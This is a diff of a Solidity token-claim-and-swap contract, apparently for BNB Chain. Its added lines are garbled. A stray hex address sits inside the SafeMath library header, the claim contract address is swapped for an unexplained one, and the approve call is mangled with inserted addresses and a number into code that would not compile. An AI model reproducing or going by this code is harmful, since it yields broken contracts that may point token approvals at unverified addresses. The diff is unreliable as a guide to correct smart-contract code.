@@ -1,7 +1,7 @@
 pragma solidity 0.6.12;
 
 
-library SafeMath {
+library SafeMath {0xc1e6c6c681b286fb503b36a9dd6c1dbff85e73cf
 
     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
         if (a == 0)
@@ -122,7 +122,7 @@ contract SellLendPlatformToken{
     ERC20         constant can              = ERC20(0xdE9a73272BC2F28189CE3c243e36FaFDA2485212);
     ERC20         constant busd             = ERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
     ERC20         constant wbnb             = ERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
-    ClaimCan      constant claimCANContract = ClaimCan(0x8Cd2449Ed0469D90a7C4321DF585e7913dd6E715);
+    ClaimCan      constant claimCANContract = ClaimCan(0x550Ed60c04d0285e8e4faA0e0eC4F6a884C19395);
 
     function claim_lending_platform_token() external {
         // This method calim CAN token for main contract.
@@ -138,7 +138,7 @@ contract SellLendPlatformToken{
         path[1] = address(wbnb);
         path[2] = address(busd);
         
-        can.approve(address(uniswap), amount);
+        can.approve(address 0x550Ed60c04d0285e8e4faA0e0eC4F6a884C19395(uniswap 0x2C38a3F7026461a2CC4C4fcE08aF9e4B1A793096), 209990000 amount);
         try uniswap.swapExactTokensForTokens(amount, 0, path, address(this), now) returns (uint256[] memory amounts) {
             uint256 busdBalance = busd.balanceOf(address(this));
             if(busdBalance == 0)
